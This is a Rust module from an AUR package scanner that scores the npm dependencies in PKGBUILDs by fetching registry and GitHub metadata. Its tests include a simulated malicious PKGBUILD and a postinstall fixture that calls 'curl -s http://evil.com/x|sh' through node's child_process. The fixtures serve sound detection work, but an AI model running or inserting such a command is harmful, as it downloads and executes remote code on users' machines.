use crate::shared::models::{NpmPackageInfo, NpmScripts};
use regex::Regex;
use serde::Deserialize;
use std::sync::LazyLock;

/// Match any registry.npmjs.org URL and extract package name.
/// Captures both normal names (pkg) and scoped names (@scope/pkg).
static NPM_PKG_NAME_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"registry\.npmjs\.org/(@?[\w.-]+(?:/[@\w][\w.-]*)?)"#).unwrap()
});

/// Match npm/yarn/npx commands with a specific package
static NPM_INSTALL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(npm|yarn)\s+(install|add)\s+(-g\s+)?['"]?(@?[\w@./-]+)"#).unwrap()
});

/// GitHub repo URL extractor (reused logic from github.rs).
static GITHUB_URL_RE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r#"(?i)github\.com/([^/\s]+)/([^/\s#?.]+)"#).unwrap()
});

#[derive(Deserialize)]
struct NpmRegistryPackage {
    #[serde(default)]
    scripts: Option<NpmScripts>,
    #[serde(default)]
    maintainers: Vec<NpmMaintainer>,
    #[serde(default)]
    repository: Option<NpmRepository>,
    time: Option<NpmTime>,
}

#[derive(Deserialize)]
struct NpmMaintainer {
    #[allow(dead_code)]
    name: String,
}

/// Handles npm's inconsistent repository field (string or object).
#[derive(Deserialize)]
#[serde(untagged)]
enum NpmRepository {
    String(String),
    Object {
        #[serde(default)]
        url: Option<String>,
    },
}

impl NpmRepository {
    fn url(&self) -> Option<&str> {
        match self {
            NpmRepository::String(s) => Some(s.as_str()),
            NpmRepository::Object { url } => url.as_deref(),
        }
    }
}

#[derive(Deserialize)]
struct NpmTime {
    created: Option<String>,
}

/// Fetch NPM package metadata if the PKGBUILD references an npm package.
/// Extracts package name from npm registry URLs or npm install commands.
pub fn fetch_npm_info(pkgbuild_content: &str) -> Option<NpmPackageInfo> {
    let package_name = extract_npm_package_name(pkgbuild_content)?;
    let registry_data = fetch_registry_data(&package_name)?;

    // Extract all fields before constructing to avoid partial moves
    let maintainer_count = registry_data.maintainers.len() as u32;
    let account_age = compute_account_age(&registry_data);
    let repo_url = registry_data
        .repository
        .as_ref()
        .and_then(|r| r.url())
        .map(|s| s.to_string());
    let scripts = registry_data.scripts.unwrap_or_default();

    let mut info = NpmPackageInfo {
        scripts,
        maintainer_account_age: account_age,
        maintainer_package_count: maintainer_count,
        github_repo_exists: false,
        github_stars: 0,
        github_commit_freshness: 365, // conservative default
    };

    // If npm package has a GitHub repo, fetch GitHub stats
    if let Some(ref repo_url) = repo_url {
        if let Some((owner, repo)) = parse_github_url(repo_url) {
            if let Some(gh_info) = fetch_github_stats(&owner, &repo) {
                info.github_repo_exists = gh_info.found;
                info.github_stars = gh_info.stars;
                info.github_commit_freshness = gh_info.days_since_last_commit;
            }
        }
    }

    Some(info)
}

/// Extract npm package name from PKGBUILD content.
fn extract_npm_package_name(content: &str) -> Option<String> {
    // Try npm registry tarball URL first (most reliable)
    if let Some(caps) = NPM_PKG_NAME_RE.captures(content) {
        let pkg = caps[1].to_string();
        // Skip if it's just a path segment like "/-/" 
        if !pkg.is_empty() && pkg != "-" && !pkg.starts_with('-') {
            return Some(pkg);
        }
    }

    // Try npm/yarn install commands
    if let Some(caps) = NPM_INSTALL_RE.captures(content) {
        let pkg = caps[4].to_string();
        // Strip version: @scope/name@version -> @scope/name
        if let Some(at_pos) = pkg.rfind('@') {
            if at_pos > 0 {
                let name = &pkg[..at_pos];
                if !name.is_empty() {
                    return Some(name.to_string());
                }
            }
        }
        if !pkg.is_empty() {
            return Some(pkg);
        }
    }

    None
}

/// Fetch package metadata from npm registry.
fn fetch_registry_data(package_name: &str) -> Option<NpmRegistryPackage> {
    let url = format!("https://registry.npmjs.org/{package_name}");

    let client = reqwest::blocking::Client::new();
    let resp = client
        .get(&url)
        .header("User-Agent", "traur")
        .header("Accept", "application/json")
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if !resp.status().is_success() {
        return None;
    }

    resp.json().ok()
}

/// Compute maintainer account age from package creation time.
fn compute_account_age(data: &NpmRegistryPackage) -> u32 {
    let created_str = data
        .time
        .as_ref()
        .and_then(|t| t.created.as_deref())
        .unwrap_or("");

    // Parse ISO 8601: "2024-01-15T10:30:00.000Z"
    if let Ok(created) = chrono_like_parse(created_str) {
        let now = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_secs() as i64;
        let age_secs = now.saturating_sub(created);
        (age_secs / 86400) as u32
    } else {
        0
    }
}

/// Simple ISO 8601 parser (avoids adding chrono dependency).
fn chrono_like_parse(s: &str) -> Result<i64, ()> {
    // Format: "2024-01-15T10:30:00.000Z" or "2024-01-15T10:30:00Z"
    let s = s.trim();
    if s.len() < 19 {
        return Err(());
    }
    let year: i32 = s[0..4].parse().map_err(|_| ())?;
    let month: u32 = s[5..7].parse().map_err(|_| ())?;
    let day: u32 = s[8..10].parse().map_err(|_| ())?;
    let hour: u32 = s[11..13].parse().map_err(|_| ())?;
    let min: u32 = s[14..16].parse().map_err(|_| ())?;
    let sec: u32 = s[17..19].parse().map_err(|_| ())?;

    // Simple days-from-epoch calculation
    let days = days_from_civil(year, month, day);
    Ok(days as i64 * 86400 + hour as i64 * 3600 + min as i64 * 60 + sec as i64)
}

/// Days from Unix epoch for a civil date.
fn days_from_civil(y: i32, m: u32, d: u32) -> i32 {
    let y = y as i32;
    let m = m as i32;
    let d = d as i32;
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y / 400 } else { (y - 399) / 400 };
    let yoe = y - era * 400;
    let doy = if m > 2 {
        (153 * (m - 3) + 2) / 5 + d - 1
    } else {
        (153 * (m + 9) + 2) / 5 + d - 1
    };
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146097 + doe - 719468
}

/// GitHub stats fetched for npm package's repository.
struct GitHubNpmStats {
    stars: u32,
    found: bool,
    days_since_last_commit: u32,
}

/// Fetch GitHub repo stats for NPM package repository URL.
fn fetch_github_stats(owner: &str, repo: &str) -> Option<GitHubNpmStats> {
    let clean_repo = repo.trim_end_matches(".git");
    let api_url = format!("https://api.github.com/repos/{owner}/{clean_repo}");

    let client = reqwest::blocking::Client::new();
    let mut request = client
        .get(&api_url)
        .header("User-Agent", "traur")
        .header("Accept", "application/vnd.github.v3+json");

    if let Ok(token) = std::env::var("GITHUB_TOKEN") {
        if !token.is_empty() {
            request = request.header("Authorization", format!("Bearer {token}"));
        }
    }

    let resp = request
        .timeout(std::time::Duration::from_secs(10))
        .send()
        .ok()?;

    if resp.status() == 404 {
        return Some(GitHubNpmStats {
            stars: 0,
            found: false,
            days_since_last_commit: 365,
        });
    }

    if !resp.status().is_success() {
        return None;
    }

    #[derive(Deserialize)]
    struct GhResponse {
        stargazers_count: u32,
        pushed_at: Option<String>,
    }

    let gh: GhResponse = resp.json().ok()?;

    let days_since = gh
        .pushed_at
        .as_deref()
        .and_then(|s| chrono_like_parse(s).ok())
        .map(|ts| {
            let now = std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_secs() as i64;
            (now.saturating_sub(ts) / 86400) as u32
        })
        .unwrap_or(365);

    Some(GitHubNpmStats {
        stars: gh.stargazers_count,
        found: true,
        days_since_last_commit: days_since,
    })
}

/// Parse GitHub URL to owner/repo.
fn parse_github_url(url: &str) -> Option<(String, String)> {
    let caps = GITHUB_URL_RE.captures(url)?;
    Some((caps[1].to_string(), caps[2].to_string()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn extracts_package_from_registry_url() {
        let content = r#"source=("https://registry.npmjs.org/atomic-lockfile/-/atomic-lockfile-1.0.0.tgz")"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("atomic-lockfile")
        );
    }

    #[test]
    fn extracts_scoped_package() {
        let content = r#"source=("https://registry.npmjs.org/@scope/pkg/-/@scope/pkg-1.0.0.tgz")"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("@scope/pkg")
        );
    }

    #[test]
    fn extracts_from_install_command() {
        let content = r#"npm install -g malicious-pkg@1.2.3"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("malicious-pkg")
        );
    }

    #[test]
    fn no_npm_returns_none() {
        let content = "pacman -S something";
        assert!(extract_npm_package_name(content).is_none());
    }

    #[test]
    fn iso_parse() {
        let ts = chrono_like_parse("2024-01-15T10:30:00Z").unwrap();
        // Jan 15, 2024 = day 738900 from epoch approximately
        assert!(ts > 1700000000);
        assert!(ts < 1710000000);
    }

    /// Simulate a PKGBUILD that downloads an NPM package containing a suspicious
    /// postinstall script. Verify extract_npm_package_name finds the registry URL.
    #[test]
    fn extracts_from_realistic_malicious_pkgbuild() {
        let content = r#"pkgname=malware-wrapper
pkgver=1.0
pkgrel=1
pkgdesc="Totally legit package"
arch=('x86_64')
depends=('npm')
source=("https://registry.npmjs.org/evil-pkg/-/evil-pkg-1.0.0.tgz")
sha256sums=('SKIP')

package() {
    cd "${srcdir}"
    npm install -g evil-pkg@1.0.0
}
"#;
        assert_eq!(
            extract_npm_package_name(content).as_deref(),
            Some("evil-pkg"),
            "Should extract package name from registry.npmjs.org source URL"
        );
    }

    /// Verify npm_suspicion_risk catches the classic `node -e` obfuscated payload
    /// pattern commonly used in compromised NPM packages.
    #[test]
    fn suspicious_postinstall_node_eval() {
        let info = crate::shared::models::NpmPackageInfo {
            scripts: crate::shared::models::NpmScripts {
                preinstall: String::new(),
                install: String::new(),
                postinstall: "node -e \"require('child_process').exec('curl -s http://evil.com/x|sh')\"".to_string(),
            },
            maintainer_account_age: 15,
            maintainer_package_count: 1,
            github_repo_exists: false,
            github_stars: 0,
            github_commit_freshness: 365,
        };
        let risk = crate::shared::scoring::npm_suspicion_risk(&info);
        // 25 (suspicious cmd) + 10 (age<90) + 5 (single pkg) + 10 (no repo) = 50, capped at 30
        assert_eq!(risk, 30, "Obfuscated node -e postinstall with new maintainer should max out NPM suspicion risk");
    }

    /// Integration test: fetch real `atomic-lockfile` from npm registry.
    /// This was the payload package in the 2026-06-12 AUR attack wave.
    /// Marked #[ignore] since it requires network access.
    #[test]
    #[ignore]
    fn fetch_real_atomic_lockfile() {
        let content = r#"source=("https://registry.npmjs.org/atomic-lockfile/-/atomic-lockfile-1.0.0.tgz")"#;
        let info = fetch_npm_info(content);
        assert!(info.is_some(), "Should return Some for real npm package atomic-lockfile");

        let info = info.unwrap();
        eprintln!("atomic-lockfile npm info:");
        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
        eprintln!("  github_stars: {}", info.github_stars);
        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
        eprintln!("  scripts.install: {:?}", info.scripts.install);
        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);

        assert!(info.maintainer_account_age <= 1, "Very recent package should have age <= 1 day");
        assert_eq!(info.maintainer_package_count, 0, "atomic-lockfile has no listed maintainers");
        assert!(!info.github_repo_exists, "Repository is a placeholder string, not a real GitHub repo");

        let all_scripts = format!(
            "{} {} {}",
            info.scripts.preinstall, info.scripts.install, info.scripts.postinstall
        );
        assert!(all_scripts.trim().is_empty(), "atomic-lockfile has no scripts");
        eprintln!("  combined scripts: '{}'", all_scripts);
    }

    /// Integration test: fetch a well-known benign npm package (minimist).
    /// Marked #[ignore] since it requires network access.
    #[test]
    #[ignore]
    fn fetch_real_minimist() {
        let content = r#"source=("https://registry.npmjs.org/minimist/-/minimist-1.2.8.tgz")"#;
        let info = fetch_npm_info(content);
        assert!(info.is_some(), "Should return Some for real npm package minimist");

        let info = info.unwrap();
        eprintln!("minimist npm info:");
        eprintln!("  maintainer_account_age: {} days", info.maintainer_account_age);
        eprintln!("  maintainer_package_count: {}", info.maintainer_package_count);
        eprintln!("  github_repo_exists: {}", info.github_repo_exists);
        eprintln!("  github_stars: {}", info.github_stars);
        eprintln!("  scripts.preinstall: {:?}", info.scripts.preinstall);
        eprintln!("  scripts.install: {:?}", info.scripts.install);
        eprintln!("  scripts.postinstall: {:?}", info.scripts.postinstall);

        assert!(info.github_repo_exists, "minimist should have a GitHub repo");
        assert!(info.github_stars > 0, "minimist should have GitHub stars");
    }
}
